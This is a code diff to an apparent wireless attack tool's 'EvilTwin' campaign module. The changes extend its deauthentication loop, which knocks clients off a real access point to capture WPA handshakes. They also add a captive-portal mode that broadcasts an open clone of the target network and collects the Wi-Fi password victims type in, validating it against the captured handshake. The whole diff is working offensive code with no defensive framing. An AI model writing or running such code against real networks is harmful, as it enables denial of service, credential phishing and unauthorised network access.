@@ -21,10 +21,11 @@ from airscope.persist.save import save_eviltwin_psk
 from airscope.persist.vault import Vault
 
 _POLL_SEC = 0.25
-_REFERENCE_TIMEOUT_SEC = 60.0
+_REFERENCE_TIMEOUT_SEC = 120.0
 _DEAUTH_PERIOD_SEC = 0.5
 _ONLINE_LIMIT = 100_000
 _YIELD_EVERY = 2_000
+_PROGRESS_EVERY_SEC = 10.0
 
 _PSK_AKMS = (0x02, 0x04, 0x06)
 
@@ -55,6 +56,7 @@ class EvilTwinInput:
     csa_channel: Optional[int] = None
     punt_period_sec: Optional[float] = None
     punt_once: bool = False
+    use_captive_portal: bool = False
 
 
 class _CandidateFeed:
@@ -98,12 +100,14 @@ class EvilTwinCampaign(Campaign):
             return "no beacon captured yet"
         return None
 
-    def __init__(self, array, target, evil_input: EvilTwinInput, log=None):
+    def __init__(self, array, target, evil_input: EvilTwinInput, log=None,
+                 existing_handshake_path=None):
         if not target.last_beacon_frame:
             raise ValueError("EvilTwin needs a captured beacon to clone; none seen yet.")
         if not target.ssid:
             raise ValueError("EvilTwin needs a known SSID: target is hidden.")
         super().__init__(ap=target, array=array)
+        self._iface = evil_input.twin_iface
         self.log = log or (lambda _m: None)
         self.ssid = target.ssid
         self.twin_iface = evil_input.twin_iface
@@ -111,9 +115,17 @@ class EvilTwinCampaign(Campaign):
         self.twin_channel = target.channel
         self.twin_bssid = evil_input.twin_bssid.lower()
         self.same_bssid = self.twin_bssid == target.bssid.lower()
-        self.twin_beacon = beacon_clone(
-            target.last_beacon_frame, self.twin_channel,
-            None if self.same_bssid else str_to_mac(self.twin_bssid))
+        self.use_captive_portal = evil_input.use_captive_portal
+        self.existing_handshake_path = existing_handshake_path
+        if self.use_captive_portal:
+            from airscope.dot11.ap import beacon_open
+            self.twin_beacon = beacon_open(
+                target.last_beacon_frame, self.twin_channel,
+                None if self.same_bssid else str_to_mac(self.twin_bssid))
+        else:
+            self.twin_beacon = beacon_clone(
+                target.last_beacon_frame, self.twin_channel,
+                None if self.same_bssid else str_to_mac(self.twin_bssid))
         self.fakeap: Optional[FakeAP] = None
         self.captured = False
         self.password: Optional[str] = None
@@ -121,6 +133,7 @@ class EvilTwinCampaign(Campaign):
         self._candidates: Optional[_CandidateFeed] = None
         self._deauth_task: Optional[asyncio.Task] = None
         self._checked_m2 = 0
+        self._captive_portal = None
 
     # ----- helpers ------------------------------------------------------------
 
@@ -189,16 +202,48 @@ class EvilTwinCampaign(Campaign):
         """Deauth until the always-on capture holds a crackable M1+M2 on the real AP."""
         self.log("[1/3] capturing a real handshake first (deauth clients + broadcast)")
         deadline = time.monotonic() + _REFERENCE_TIMEOUT_SEC
+        deauths_sent = 0
+        last_progress = time.monotonic()
         while not self.stopped:
             if time.monotonic() > deadline:
-                self.log("[bold red]✗ no real handshake captured before timeout; "
-                         "EvilTwin aborted[/bold red]")
+                self._log_step1_failure(deauths_sent)
                 return False
             if self._crackable_instances(self.ap.bssid.lower()):
                 return True
             await self._deauth_once()
+            deauths_sent += 1
+            now = time.monotonic()
+            if now - last_progress >= _PROGRESS_EVERY_SEC:
+                last_progress = now
+                self._log_step1_progress(deauths_sent)
             await asyncio.sleep(_POLL_SEC)
         return False
+
+    def _log_step1_progress(self, deauths_sent: int) -> None:
+        ap = self.array.access_points.get(self.ap.bssid.lower())
+        hs_count = len(ap.handshakes) if ap else 0
+        total_eapol = sum(len(hs.messages) for hs in ap.handshakes.values()) if ap else 0
+        self.log(f"[dim]  ... {deauths_sent} deauth bursts sent, "
+                 f"{hs_count} handshake(s), {total_eapol} EAPOL frame(s) captured[/dim]")
+
+    def _log_step1_failure(self, deauths_sent: int) -> None:
+        ap = self.array.access_points.get(self.ap.bssid.lower())
+        hs_count = len(ap.handshakes) if ap else 0
+        total_eapol = sum(len(hs.messages) for hs in ap.handshakes.values()) if ap else 0
+        clients = self._target_clients()
+        parts = [f"{deauths_sent} deauth bursts"]
+        if clients:
+            parts.append(f"{len(clients)} client(s) targeted")
+        else:
+            parts.append("[red]no clients seen[/red]")
+        if hs_count:
+            parts.append(f"{hs_count} handshake(s), {total_eapol} EAPOL frames")
+            parts.append("[dim](need M1+M2 crackable pair)[/dim]")
+        else:
+            parts.append("no handshakes captured")
+        self.log(f"[bold red]✗ no real handshake captured before timeout "
+                 f"({_REFERENCE_TIMEOUT_SEC:.0f}s)[/bold red]")
+        self.log(f"[dim]  {', '.join(parts)}[/dim]")
 
     # ----- Step 2: twin beacon + rapid deauth, concurrently ---------------------
 
@@ -210,10 +255,15 @@ class EvilTwinCampaign(Campaign):
             self.array.note_own_beacon(self.twin_bssid, self.twin_channel, self.twin_beacon)
         self.fakeap = FakeAP(self.twin_iface, str_to_mac(self.twin_bssid), self.ssid,
                              self.twin_channel, self.twin_beacon, rx_source=self.twin_iface,
-                             record_m1=self.array.record_injected_eapol)
+                             record_m1=self.array.record_injected_eapol,
+                             open_mode=self.use_captive_portal)
         await self.fakeap.start()
-        self.log(f"[2/3] twin live on ch {self.twin_channel} (WPA2-only RSN, {self.ssid!r}); "
-                 "rapid deauth running")
+        if self.use_captive_portal:
+            self.log(f"[2/3] twin live on ch {self.twin_channel} (OPEN, {self.ssid!r}); "
+                     "captive portal running")
+        else:
+            self.log(f"[2/3] twin live on ch {self.twin_channel} (WPA2-only RSN, {self.ssid!r}); "
+                     "rapid deauth running")
 
     def _deauth_loop(self) -> asyncio.Task:
         async def _loop() -> None:
@@ -224,8 +274,8 @@ class EvilTwinCampaign(Campaign):
         return asyncio.create_task(_loop())
 
     async def _deauth_once(self) -> None:
-        for mac in self._target_clients():
-            await self.punt_iface.deauth_client(self.ap.bssid, mac, rounds=2)
+        for client in self._target_clients():
+            await self.punt_iface.deauth_client(self.ap.bssid, client.mac, rounds=2)
         await self.punt_iface.deauth_broadcast(self.ap.bssid, count=8)
 
     # ----- Step 3: online MIC recovery over the twin's 4-way --------------------
@@ -265,18 +315,64 @@ class EvilTwinCampaign(Campaign):
             eapol_m3(str_to_mac(self.twin_bssid), str_to_mac(client_mac),
                      pair.anonce_frame.nonce, mic))
 
+    # ----- Step 3: captive portal mode ----------------------------------------
+
+    async def _step3_captive_portal(self) -> None:
+        """Launch captive portal HTTP server and wait for a password submission."""
+        from airscope.campaigns.eviltwin.captive_portal import CaptivePortal
+
+        instances = self._crackable_instances(self.ap.bssid.lower())
+        if not instances:
+            self.log("[bold red]no handshake available for validation[/bold red]")
+            return
+
+        hs, pair = instances[0]
+
+        def _on_password(password: str) -> None:
+            self.password = password
+            self._recovered(password)
+
+        self._captive_portal = CaptivePortal(
+            wlan_iface=self.twin_iface,
+            ssid=self.ssid,
+            bssid=self.twin_bssid,
+            channel=self.twin_channel,
+            hs=hs, pair=pair,
+            log_fn=self.log,
+            on_password=_on_password,
+        )
+        self._captive_portal.start()
+
+        self.log("[3/3] captive portal active; waiting for password submission")
+        while not self.stopped and self.password is None:
+            await asyncio.sleep(0.5)
+
+        if self._captive_portal is not None:
+            self._captive_portal.stop()
+            self._captive_portal = None
+
     # ----- lifecycle: _loop = the work; teardown = release the radio --------------
 
     async def _loop(self) -> None:
-        if not await self._capture_reference():
-            return
-        self._deauth_task = self._deauth_loop()
-        await self._step2_run_twin()
-        await self._step3_recover()
+        if self.existing_handshake_path is not None:
+            self.log(f"[et] using existing handshake: {self.existing_handshake_path}")
+        else:
+            if not await self._capture_reference():
+                return
+        if self.use_captive_portal:
+            await self._step2_run_twin()
+            await self._step3_captive_portal()
+        else:
+            self._deauth_task = self._deauth_loop()
+            await self._step2_run_twin()
+            await self._step3_recover()
 
     async def teardown(self) -> None:
         if self._deauth_task is not None:
             self._deauth_task.cancel()
+        if self._captive_portal is not None:
+            self._captive_portal.stop()
+            self._captive_portal = None
         if self.fakeap is not None:
             await self.fakeap.stop()
         self.array.stop_ignoring_stray_beacons(self.twin_bssid)
